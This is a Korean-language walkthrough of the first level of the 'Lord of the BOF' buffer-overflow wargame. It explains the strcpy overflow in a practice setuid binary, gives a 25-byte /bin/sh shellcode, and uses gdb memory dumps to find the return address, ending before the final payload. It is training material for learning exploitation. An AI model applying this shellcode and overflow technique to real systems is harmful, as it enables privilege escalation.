1번 gate -> gremlin
===================

```  
id = 'gate'
pw = 'gate'
```

--------------------------------------------------------------
"ls" 명령어로 파일들 확인
```   
[gate@localhost gate]$ ls  
agremlin  gremlin.c  
```  

"cat gremlin.c"로 c파일 확인  
```  
[gate@localhost gate]$ cat gremlin.c
/*
	The Lord of the BOF : The Fellowship of the BOF
	- gremlin
	- simple BOF
*/

int main(int argc, char *argv[])
{
    char buffer[256];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
[gate@localhost gate]$  
```  

인자는 무조건 2개이상 주어야 되고  
2번째 인자값을 buffer에 복사 buffer값을 출력하는 구도  

### strcpy함수의 취약점   
>(srtingcopy)strcpy함수는 strcpy(인자1, 인자2); 일때<br>
>인자1에 인자 2의 값을 복사해주는데 이떄 인자1의 크기에 상관없이<br>
>인자 2의 모든 값을 복사해서 인자1의 영역너머를 우리가 변조할 수 있게됨<br>  

### 인자 전달방법
>파일을 실행할때는 "./파일명"으로 실행  <br>
>여기에 인자를 포함해서 전달하려면 뒤에 인자로 넣을 것 을 추가<br>   
>파이썬으로 전달하려면? ex) ./gremlin `python -c 'print "A"*100'`
  

## 공략시작@
우리가 쓸 쉘코드
```  
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"  
```
크기 = 25bytes

스택 프레임 구조   
>buffer(256) | SFP(4) | ret addr(4)  

260byte모두 덮고 속에다가 (nop)\x90이랑 쉘코드 25바이트를 넣고 ret add를 찾아서 마지막 4byte를 후루룩

-------------------------------
## ret addr찾기  
  
### gremlin파일 접근
우선 gremlin파일은 
```
[gate@localhost gate]$ ls -l
total 16
-rwsr-sr-x    1 gremlin  gremlin     11987 Feb 26  2010 gremlin
-rw-rw-r--    1 gate     gate          272 Apr  7 21:42 gremlin.c
[gate@localhost gate]$ 
```
보이는 것과 같이 우리 다음레벨인 gremlin의 권한을 가지고있으므로 gdb를 쓸 수 없다.
  
    
디렉토리를 하나 만들고 그 속에다가 gremlin파일을 우리가 건드릴 수 있도록 복사를 해주자.
```
[gate@localhost gate]$ mkdir tmp
[gate@localhost gate]$ cp gremlin tmp
[gate@localhost gate]$ cd tmp 
[gate@localhost tmp]$ ls
gremlin
gate@localhost tmp]$
```
>tmp 디렉토리 생성후 cp명령어로 tmp디렉토리에 gremlin파일 복사 
  
  
#### 파일 뜯어보기 
```
[gate@localhost tmp]$ gdb -q gremlin
(gdb)
```
  
gdb열고

```
(gdb)disas main
Dump of assembler code for function main:
0x8048430 <main>:	push   %ebp
0x8048431 <main+1>:	mov    %esp,%ebp
0x8048433 <main+3>:	sub    $0x100,%esp
0x8048439 <main+9>:	cmpl   $0x1,0x8(%ebp)
0x804843d <main+13>:	jg     0x8048456 <main+38>
0x804843f <main+15>:	push   $0x80484e0
0x8048444 <main+20>:	call   0x8048350 <printf>
0x8048449 <main+25>:	add    $0x4,%esp
0x804844c <main+28>:	push   $0x0
0x804844e <main+30>:	call   0x8048360 <exit>
0x8048453 <main+35>:	add    $0x4,%esp
0x8048456 <main+38>:	mov    0xc(%ebp),%eax
0x8048459 <main+41>:	add    $0x4,%eax
0x804845c <main+44>:	mov    (%eax),%edx
0x804845e <main+46>:	push   %edx
0x804845f <main+47>:	lea    0xffffff00(%ebp),%eax
0x8048465 <main+53>:	push   %eax
0x8048466 <main+54>:	call   0x8048370 <strcpy>
0x804846b <main+59>:	add    $0x8,%esp
0x804846e <main+62>:	lea    0xffffff00(%ebp),%eax
0x8048474 <main+68>:	push   %eax
0x8048475 <main+69>:	push   $0x80484ec
0x804847a <main+74>:	call   0x8048350 <printf>
0x804847f <main+79>:	add    $0x8,%esp
0x8048482 <main+82>:	leave  
0x8048483 <main+83>:	ret    
0x8048484 <main+84>:	nop    
0x8048485 <main+85>:	nop    
0x8048486 <main+86>:	nop    
0x8048487 <main+87>:	nop    
0x8048488 <main+88>:	nop    
0x8048489 <main+89>:	nop    
0x804848a <main+90>:	nop    
0x804848b <main+91>:	nop    
0x804848c <main+92>:	nop    
0x804848d <main+93>:	nop    
0x804848e <main+94>:	nop    
0x804848f <main+95>:	nop    
End of assembler dump.
(gdb) 

```

이상한 어셈블들을 볼 수 있다.   

우선 나중에 편하기 위핵서 strcpy전에 break point를 넣어주자
대충 main+47정도면 좋을 것 같다.
```
(gdb) b *main+47
Breakpoint 1 at 0x804845f
(gdb) 
```
이상태에서 인자값으로 ret addr의 주소를 알기위해서 "A"260개와 "\x90" 4개를 넣어보자 
>\x90이 4개가 저장된 주소가 ret addr일 것이다.
```
(gdb) r `python -c 'print"A"*260 + "\x90"*4'`
Starting program: /home/gate/tmp/gremlin `python -c 'print"A"*260 + "\x90"*4'`

Breakpoint 1, 0x804845f in main ()
(gdb) 
```
걸어둔 break point에서 잘 멈췄다.
이상태에서 메모리를 뜯어보자.
```
(gdb) x/100x $esp
0xbffff904:	0xbffffb5f	0x00005a62	0x400081e6	0x40029ad5
0xbffff914:	0x40022004	0x40013868	0x40013ed0	0x08048200
0xbffff924:	0x00003d60	0x40021ca0	0x000006f3	0x40021fd0
0xbffff934:	0x4001ad70	0x400143e0	0x00000003	0x40014650
0xbffff944:	0x00000001	0xbffff960	0x08048170	0x400140d4
0xbffff954:	0x078e530f	0xbffff9dc	0x08048256	0x40021ca0
0xbffff964:	0x400143e0	0xbffff9ec	0x400261a6	0x4001ead0
0xbffff974:	0x400143e0	0x40020290	0x400143e0	0x400140d4
0xbffff984:	0x0177ff8e	0xbffffa0c	0x08048244	0x40021590
0xbffff994:	0x400143e0	0xbfffffa5	0xbffff9ff	0x00000020
0xbffff9a4:	0x401081ec	0xbffff9e0	0x4000a7fd	0x40010c27
0xbffff9b4:	0x40014680	0x00000007	0x4000a74e	0x08049510
0xbffff9c4:	0x4000ae60	0xbffffa54	0x40013ed0	0x08048170
0xbffff9d4:	0x0804951c	0x08048256	0x40021ca0	0xbffffa08
0xbffff9e4:	0x4000a970	0x400f855b	0x08049510	0x4000ae60
0xbffff9f4:	0xbffffa54	0xbffffa08	0x0804841b	0x080494fc
0xbffffa04:	0x08049510	0xbffffa28	0x400309cb	0x00000002
0xbffffa14:	0xbffffa54	0xbffffa60	0x40013868	0x00000002
0xbffffa24:	0x08048380	0x00000000	0x080483a1	0x08048430
0xbffffa34:	0x00000002	0xbffffa54	0x080482e0	0x080484bc
---Type <return> to continue, or q <return> to quit---
0xbffffa44:	0x4000ae60	0xbffffa4c	0x40013e90	0x00000002
0xbffffa54:	0xbffffb48	0xbffffb5f	0x00000000	0xbffffc68
0xbffffa64:	0xbffffc7b	0xbffffc92	0xbffffcb1	0xbffffcd3
0xbffffa74:	0xbffffcdd	0xbffffea0	0xbffffebf	0xbffffed9
0xbffffa84:	0xbffffeee	0xbfffff0a	0xbfffff15	0xbfffff2d
(gdb) 
```
위의 명령은 100개의 주소값을 볼 수 있게 해준거였는데
미리 말하면 200개 까지 뜯어봐도 보이지 않기때문에
ebp를 뜯어보도록 하자
```
(gdb) x/200x $ebp
0xbffffa08:	0xbffffa28	0x400309cb	0x00000002	0xbffffa54
0xbffffa18:	0xbffffa60	0x40013868	0x00000002	0x08048380
0xbffffa28:	0x00000000	0x080483a1	0x08048430	0x00000002
0xbffffa38:	0xbffffa54	0x080482e0	0x080484bc	0x4000ae60
0xbffffa48:	0xbffffa4c	0x40013e90	0x00000002	0xbffffb48
0xbffffa58:	0xbffffb5f	0x00000000	0xbffffc68	0xbffffc7b
0xbffffa68:	0xbffffc92	0xbffffcb1	0xbffffcd3	0xbffffcdd
0xbffffa78:	0xbffffea0	0xbffffebf	0xbffffed9	0xbffffeee
0xbffffa88:	0xbfffff0a	0xbfffff15	0xbfffff2d	0xbfffff3a
0xbffffa98:	0xbfffff42	0xbfffff53	0xbfffff5d	0xbfffff6b
0xbffffaa8:	0xbfffff7c	0xbfffff8a	0xbfffff95	0xbfffffa5
0xbffffab8:	0x00000000	0x00000003	0x08048034	0x00000004
0xbffffac8:	0x00000020	0x00000005	0x00000006	0x00000006
0xbffffad8:	0x00001000	0x00000007	0x40000000	0x00000008
0xbffffae8:	0x00000000	0x00000009	0x08048380	0x0000000b
0xbffffaf8:	0x000001f4	0x0000000c	0x000001f4	0x0000000d
0xbffffb08:	0x000001f4	0x0000000e	0x000001f4	0x00000010
0xbffffb18:	0x0f8bfbff	0x0000000f	0xbffffb43	0x00000000
0xbffffb28:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffb38:	0x00000000	0x00000000	0x69000000	0x00363836
---Type <return> to continue, or q <return> to quit---
0xbffffb48:	0x6d6f682f	0x61672f65	0x742f6574	0x672f706d
0xbffffb58:	0x6c6d6572	0x41006e69	0x41414141	0x41414141
0xbffffb68:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb78:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb88:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb98:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffba8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbb8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbc8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbd8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbe8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbf8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc08:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc18:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc28:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc38:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc48:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc58:	0x41414141	0x41414141	0x90414141	0x00909090
0xbffffc68:	0x3d445750	0x6d6f682f	0x61672f65	0x742f6574
0xbffffc78:	0x5200706d	0x544f4d45	0x534f4845	0x39313d54
---Type <return> to continue, or q <return> to quit---
0xbffffc88:	0x36312e32	0x2e332e38	0x4f480031	0x414e5453
0xbffffc98:	0x6c3d454d	0x6c61636f	0x74736f68	0x636f6c2e
0xbffffca8:	0x6f646c61	0x6e69616d	0x53454c00	0x45504f53
0xbffffcb8:	0x2f7c3d4e	0x2f727375	0x2f6e6962	0x7373656c
0xbffffcc8:	0x65706970	0x2068732e	0x55007325	0x3d524553
0xbffffcd8:	0x65746167	0x5f534c00	0x4f4c4f43	0x6e3d5352
0xbffffce8:	0x30303d6f	0x3d69663a	0x643a3030	0x31303d69
0xbffffcf8:	0x3a34333b	0x303d6e6c	0x36333b31	0x3d69703a
0xbffffd08:	0x333b3034	0x6f733a33	0x3b31303d	0x623a3533
0xbffffd18:	0x30343d64	0x3b33333b	0x633a3130	0x30343d64
(gdb) 
```
우리가 넣은 A값이 대충 0xbfffb58부터 시작되는 중
그리고 ret addr위치에 넣었던 "\x90" 4개는 0xbfffc58에서 실행되는중
대충 그 주위에서 ret addr를 넣어주면 될 듯 싶다.
